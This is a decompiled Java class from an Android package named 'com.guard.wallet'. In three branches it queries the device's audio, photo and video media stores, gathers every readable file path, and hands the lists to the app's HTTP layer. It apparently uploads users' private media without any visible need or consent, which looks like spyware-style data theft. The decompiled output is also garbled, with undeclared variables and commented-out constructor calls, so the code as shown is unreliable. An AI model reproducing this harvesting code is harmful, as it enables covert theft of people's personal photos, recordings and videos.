package com.guard.wallet.thread;

import a1.q;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import java.io.File;
import java.util.LinkedList;
import java.util.concurrent.Callable;

public final class a implements Callable {
   public final int a;
   public final Uri b;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final Boolean a() {
      int var1 = this.a;
      ContentResolver var4 = null;
      Cursor var2 = null;
      Cursor var3 = null;
      switch (var1) {
         case 0:
            if (com.guard.wallet.utils.g.Z() != null && com.guard.wallet.utils.g.m()) {
               LinkedList var50 = new LinkedList();
               ContentResolver var39 = com.guard.wallet.utils.g.Z().getContentResolver();
               if (var39 != null) {
                  var2 = var4;

                  label227: {
                     Exception var54;
                     label285: {
                        try {
                           var3 = var39.query(this.b, new String[]{"_id", "_data", "_display_name"}, null, null, "date_modified desc");
                        } catch (Exception var22) {
                           var54 = var22;
                           boolean var71 = false;
                           break label285;
                        }

                        var47 = var3;
                        if (var3 == null) {
                           break label227;
                        }

                        while (true) {
                           var2 = var3;
                           var47 = var3;

                           try {
                              if (!var3.moveToNext()) {
                                 break label227;
                              }
                           } catch (Exception var21) {
                              var54 = var21;
                              boolean var72 = false;
                              break;
                           }

                           var2 = var3;

                           String var52;
                           try {
                              var52 = var3.getString(var3.getColumnIndex("_data"));
                           } catch (Exception var20) {
                              var54 = var20;
                              boolean var73 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              var48 = new File(var52);
                           } catch (Exception var19) {
                              var54 = var19;
                              boolean var74 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              // [VF-FIX] var48./* $VF: Unable to resugar constructor */<init>(var52);
                           } catch (Exception var18) {
                              var54 = var18;
                              boolean var75 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              if (!var48.exists()) {
                                 continue;
                              }
                           } catch (Exception var17) {
                              var54 = var17;
                              boolean var76 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              if (!var48.isFile()) {
                                 continue;
                              }
                           } catch (Exception var16) {
                              var54 = var16;
                              boolean var77 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              var50.add(var48);
                           } catch (Exception var15) {
                              var54 = var15;
                              boolean var78 = false;
                              break;
                           }
                        }
                     }

                     Exception var41 = var54;
                     q.s("AudioAlbumChangeThread", var41);
                     var47 = var2;
                  }

                  if (var47 != null) {
                     var47.close();
                  }
               }

               if (!var50.isEmpty()) {
                  com.guard.wallet.http.l.A(var50);
               }
            }

            return Boolean.TRUE;
         case 1:
            if (com.guard.wallet.utils.g.Z() != null && com.guard.wallet.utils.g.o()) {
               LinkedList var49 = new LinkedList();
               var4 = com.guard.wallet.utils.g.Z().getContentResolver();
               if (var4 != null) {
                  var2 = var3;

                  label186: {
                     label185: {
                        Exception var53;
                        label283: {
                           try {
                              var3 = var4.query(this.b, new String[]{"_id", "_data", "_display_name"}, null, null, "date_modified desc");
                           } catch (Exception var14) {
                              var53 = var14;
                              boolean var63 = false;
                              break label283;
                           }

                           var45 = var3;
                           if (var3 == null) {
                              break label186;
                           }

                           var2 = var3;
                           var45 = var3;

                           try {
                              if (!var3.moveToNext()) {
                                 break label186;
                              }
                           } catch (Exception var13) {
                              var53 = var13;
                              boolean var64 = false;
                              break label283;
                           }

                           var2 = var3;

                           try {
                              var46 = var3.getString(var3.getColumnIndex("_data"));
                           } catch (Exception var12) {
                              var53 = var12;
                              boolean var65 = false;
                              break label283;
                           }

                           var2 = var3;

                           File var51;
                           try {
                              var51 = new File(var46);
                           } catch (Exception var11) {
                              var53 = var11;
                              boolean var66 = false;
                              break label283;
                           }

                           var2 = var3;

                           try {
                              // [VF-FIX] var51./* $VF: Unable to resugar constructor */<init>(var46);
                           } catch (Exception var10) {
                              var53 = var10;
                              boolean var67 = false;
                              break label283;
                           }

                           var2 = var3;
                           var45 = var3;

                           try {
                              if (!var51.exists()) {
                                 break label186;
                              }
                           } catch (Exception var9) {
                              var53 = var9;
                              boolean var68 = false;
                              break label283;
                           }

                           var2 = var3;
                           var45 = var3;

                           try {
                              if (!var51.isFile()) {
                                 break label186;
                              }
                           } catch (Exception var8) {
                              var53 = var8;
                              boolean var69 = false;
                              break label283;
                           }

                           var2 = var3;

                           try {
                              var49.add(var51);
                              break label185;
                           } catch (Exception var7) {
                              var53 = var7;
                              boolean var70 = false;
                           }
                        }

                        Exception var38 = var53;
                        q.s("PhotoAlbumChangeThread", var38);
                        var45 = var2;
                        break label186;
                     }

                     var45 = var3;
                  }

                  if (var45 != null) {
                     var45.close();
                  }
               }

               if (!var49.isEmpty()) {
                  com.guard.wallet.http.l.D(var49);
               }
            }

            return Boolean.TRUE;
         default:
            if (com.guard.wallet.utils.g.Z() != null && com.guard.wallet.utils.g.q()) {
               LinkedList var5 = new LinkedList();
               ContentResolver var34 = com.guard.wallet.utils.g.Z().getContentResolver();
               if (var34 != null) {
                  label273: {
                     Exception var10000;
                     label288: {
                        try {
                           var3 = var34.query(this.b, new String[]{"_id", "_data", "_display_name"}, null, null, "date_modified desc");
                        } catch (Exception var31) {
                           var10000 = var31;
                           boolean var10001 = false;
                           break label288;
                        }

                        var42 = var3;
                        if (var3 == null) {
                           break label273;
                        }

                        while (true) {
                           var2 = var3;
                           var42 = var3;

                           try {
                              if (!var3.moveToNext()) {
                                 break label273;
                              }
                           } catch (Exception var30) {
                              var10000 = var30;
                              boolean var55 = false;
                              break;
                           }

                           var2 = var3;

                           String var6;
                           try {
                              var6 = var3.getString(var3.getColumnIndex("_data"));
                           } catch (Exception var29) {
                              var10000 = var29;
                              boolean var56 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              var43 = new File(var6);
                           } catch (Exception var28) {
                              var10000 = var28;
                              boolean var57 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              // [VF-FIX] var43./* $VF: Unable to resugar constructor */<init>(var6);
                           } catch (Exception var27) {
                              var10000 = var27;
                              boolean var58 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              if (!var43.exists()) {
                                 continue;
                              }
                           } catch (Exception var26) {
                              var10000 = var26;
                              boolean var59 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              if (!var43.isFile()) {
                                 continue;
                              }
                           } catch (Exception var25) {
                              var10000 = var25;
                              boolean var60 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              if (!var43.canRead()) {
                                 continue;
                              }
                           } catch (Exception var24) {
                              var10000 = var24;
                              boolean var61 = false;
                              break;
                           }

                           var2 = var3;

                           try {
                              var5.add(var43);
                           } catch (Exception var23) {
                              var10000 = var23;
                              boolean var62 = false;
                              break;
                           }
                        }
                     }

                     Exception var36 = var10000;
                     q.s("VideoAlbumChangeThread", var36);
                     var42 = var2;
                  }

                  if (var42 != null) {
                     var42.close();
                  }
               }

               if (!var5.isEmpty()) {
                  com.guard.wallet.http.l.E(var5);
               }
            }

            return Boolean.TRUE;
      }
   }
}
